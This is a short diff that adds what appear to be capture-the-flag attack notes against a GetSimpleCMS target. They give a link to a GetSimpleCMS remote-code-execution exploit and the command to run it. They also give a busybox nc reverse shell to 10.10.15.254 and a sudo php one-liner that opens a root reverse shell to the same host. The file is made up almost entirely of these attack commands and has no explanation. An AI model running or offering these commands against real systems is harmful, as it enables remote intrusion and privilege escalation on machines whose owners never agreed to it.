@@ -1,0 +1,6 @@
+https://github.com/cybersecaware/GetSimpleCMS-RCE
+python3 GetSimpleCMS-RCE.py
+busybox nc 10.10.15.254 9002 -e /bin/bash
+sudo /usr/bin/php -r '$sock=fsockopen("10.10.15.254",9003);`sh <&3 >&3 2>&3`;'
+
+
